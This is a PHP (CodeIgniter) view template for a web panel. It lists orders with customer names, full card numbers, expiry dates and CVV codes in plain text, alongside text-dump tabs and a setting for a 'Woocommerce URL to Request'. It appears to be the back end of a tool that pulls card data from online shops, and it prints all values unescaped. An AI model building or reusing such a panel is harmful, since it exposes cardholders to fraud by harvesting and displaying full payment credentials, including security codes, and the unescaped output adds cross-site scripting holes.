<?php
defined('BASEPATH') OR exit('No direct script access allowed');
?><!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="utf-8">
	<title>Welcome to CodeIgniter</title>

	<style type="text/css">

	::selection { background-color: #E13300; color: white; }
	::-moz-selection { background-color: #E13300; color: white; }

	body {
		background-color: #fff;
		margin: 40px;
		font: 13px/20px normal Helvetica, Arial, sans-serif;
		color: #4F5155;
	}

	a {
		color: #003399;
		background-color: transparent;
		font-weight: normal;
	}

	h1 {
		color: #444;
		background-color: transparent;
		border-bottom: 1px solid #D0D0D0;
		font-size: 19px;
		font-weight: normal;
		margin: 0 0 14px 0;
		padding: 14px 15px 10px 15px;
	}

	code {
		font-family: Consolas, Monaco, Courier New, Courier, monospace;
		font-size: 12px;
		background-color: #f9f9f9;
		border: 1px solid #D0D0D0;
		color: #002166;
		display: block;
		margin: 14px 0 14px 0;
		padding: 12px 10px 12px 10px;
	}

	#body {
		margin: 0 15px 0 15px;
	}

	p.footer {
		text-align: right;
		font-size: 11px;
		border-top: 1px solid #D0D0D0;
		line-height: 32px;
		padding: 0 10px 0 10px;
		margin: 20px 0 0 0;
	}

	#container {
		margin: 10px;
		border: 1px solid #D0D0D0;
		box-shadow: 0 0 8px #D0D0D0;
	}
	</style>
	<link rel="stylesheet" href='<?php echo base_url('public/bootstrap.min.css') ?>' type='text/css'/>
	<link rel="stylesheet" href='<?php echo base_url('public/style.css') ?>' type='text/css'/>
	<script type='text/javascript' src="<?php echo base_url('public/jquery.min.js') ?>"></script>
	<script type='text/javascript' src="<?php echo base_url('public/bootstrap.min.js') ?>"></script>
	
</head>
<body>
	<div id="loading-id" class="loading">
	<div class="ripple"></div>
	</div>
	<div style="padding:40px">
	<div id="exTab1" class="container">	
		<ul  class="nav nav-pills">
			<li class="active">
			<a  href="#orders" data-toggle="tab">Orders</a>
			</li>
			<li><a href="#orders1" data-toggle="tab">Shipping1</a>
			</li>
			<li><a href="#orders2" data-toggle="tab">Shipping2</a>
			</li>
			<li><a href="#view" data-toggle="tab">View1</a>
			</li>
			<li><a href="#view1" data-toggle="tab">View2</a>
			</li>
			<li><a href="#setting" data-toggle="tab">Setting</a>
			</li>
		</ul>

		<div class="tab-content clearfix">
			<div class="tab-pane active" id="orders">
				<div class="all-orders-wrapper">
					<h3>Here are Orders</h3>
					<div class="orders-wrapper">
						<?php if(isset($none))  { ?>
						<?php foreach($none as $order) {?>
							<div class="order-wrapper">
								<table>
									<tbody>
										<tr>
											<td colspan="2">
												<?php echo $order['order_number'] ?>
											</td>
										</tr>
										<tr>
											<td>Customer Name</td>
											<td><?php echo $order['customer_name'] ?></td>
										</tr>
										<tr>
											<td>Card Number</td>
											<td><?php echo $order['cc_number'] ?></td>
										</tr>
										<tr>
											<td>Valid until</td>
											<td><?php echo $order['cc_exp_month'] ?>/<?php echo $order['cc_exp_month'] ?><?php echo $order['cc_exp_year'] ?></td>
										</tr>
										<tr>
											<td>Card Security Code</td>
											<td><?php echo $order['cvv'] ?></td>
										</tr>
										<tr>
										</tr>
									</tbody>
								</table>
								<button class="btn-delete" data-part="0" data-url="<?php echo site_url();?>" data-id="<?php echo $order['order_id'] ?>">Delete</button>
							</div>
						<?php } ?>
						<?php } ?>
					</div>
					
				</div>
			</div>
			<div class="tab-pane" id="orders1">
				<div class="all-orders-wrapper">
					<h3>Here are Orders</h3>
					<div class="orders-wrapper">
						<?php if(isset($only))  { ?>
						<?php foreach($only as $order) {?>
							<div class="order-wrapper">
								<table>
									<tbody>
											<td colspan="2">
												<?php echo $order['order_number'] ?>
											</td>
										<tr>
											<td>Customer Name</td>
											<td><?php echo $order['customer_name'] ?></td>
										</tr>
										<tr>
											<td>Card Number</td>
											<td><?php echo $order['cc_number'] ?></td>
										</tr>
										<tr>
											<td>Valid until</td>
											<td><?php echo $order['cc_exp_month'] ?>/<?php echo $order['cc_exp_month'] ?><?php echo $order['cc_exp_year'] ?></td>
										</tr>
										<tr>
											<td>Card Security Code</td>
											<td><?php echo $order['cvv'] ?></td>
										</tr>
										<tr>
										</tr>
									</tbody>
								</table>
								<button class="btn-delete" data-part="1" data-url="<?php echo site_url();?>" data-id="<?php echo $order['order_id'] ?>">Delete</button>
							</div>
						<?php } ?>
						<?php } ?>
					</div>
					
				</div>
			</div>
			<div class="tab-pane" id="orders2">
				<div class="all-orders-wrapper">
					<h3>Here are Orders</h3>
					<div class="orders-wrapper">
						<?php if(isset($days))  { ?>
						<?php foreach($days as $order) {?>
							<div class="order-wrapper">
								<table>
									<tbody>
											<td colspan="2">
												<?php echo $order['order_number'] ?>
											</td>
										<tr>
											<td>Customer Name</td>
											<td><?php echo $order['customer_name'] ?></td>
										</tr>
										<tr>
											<td>Card Number</td>
											<td><?php echo $order['cc_number'] ?></td>
										</tr>
										<tr>
											<td>Valid until</td>
											<td><?php echo $order['cc_exp_month'] ?>/<?php echo $order['cc_exp_month'] ?><?php echo $order['cc_exp_year'] ?></td>
										</tr>
										<tr>
											<td>Card Security Code</td>
											<td><?php echo $order['cvv'] ?></td>
										</tr>
										<tr>
										</tr>
									</tbody>
								</table>
								<button class="btn-delete" data-part="2" data-url="<?php echo site_url();?>" data-id="<?php echo $order['order_id'] ?>">Delete</button>
							</div>
						<?php } ?>
						<?php } ?>
					</div>
					
				</div>
			</div>
			<div class="tab-pane" id="view">
				<div class="text-wrapper">
					<textarea class="text-content" id="text-content" name="" cols="30" rows="30"><?php if(isset($content)) echo $content;?></textarea>
					<div class="clear-btn">
						<button class="clear-file" data-id="0" data-url="<?php echo site_url();?>">Clear</button>
					</div>
				</div>
			</div>
			<div class="tab-pane" id="view1">
				<div class="text-wrapper1">
					<div class="text-wrapper-sub">
						<textarea class="text-content" id="text-content1" name="" cols="30" rows="30">
						<?php if (isset($content1)) echo $content1;?>
						</textarea>
						<div class="clear-btn">
							<button class="clear-file" data-id="1" data-url="<?php echo site_url();?>">Clear</button>
						</div>
					</div>
					<div class="text-wrapper-sub">
						<textarea class="text-content" id="text-content2" name="" cols="30" rows="30">
						<?php if (isset($content2)) echo $content2;?>
						</textarea>
						<div class="clear-btn">
							<button class="clear-file" data-id="2" data-url="<?php echo site_url();?>">Clear</button>
						</div>
					</div>
				</div>
			</div>
			<div class="tab-pane" id="setting">
				<div class="text-wrapper">
				<label>Woocommerce URL to Request : </label>
				<input type="text" id="woocommerce-url" value="<?php echo $address ?>">
				<div class="clear-btn">
					<button id="setting-btn" data-url="<?php echo site_url();?>">Save</button>
				</div>
				</div>
			</div>
		</div>
	</div>
	<script type='text/javascript' src="<?php echo base_url('public/sendback.js') ?>"></script>

</body>
</html>